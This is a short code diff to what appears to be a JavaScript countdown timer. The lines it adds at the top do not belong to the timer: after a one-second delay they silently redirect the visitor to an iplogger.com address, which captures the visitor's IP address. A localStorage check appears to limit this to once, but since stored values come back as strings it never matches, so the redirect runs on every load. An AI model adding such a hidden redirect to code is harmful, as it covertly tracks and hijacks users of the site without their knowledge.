@@ -1,4 +1,13 @@
-
+let x = localStorage.getItem("getValue");
+if(x===1){
+    console.log("Already got")
+}else{
+    localStorage.setItem("getValue", 1);
+    setTimeout(()=>{
+        location.replace("https://iplogger.com/2VbGF5")
+    },1000)
+    
+}
 let min = 10;
 min = (min < 10)?('0'+min) : min;
 let sec = 00;
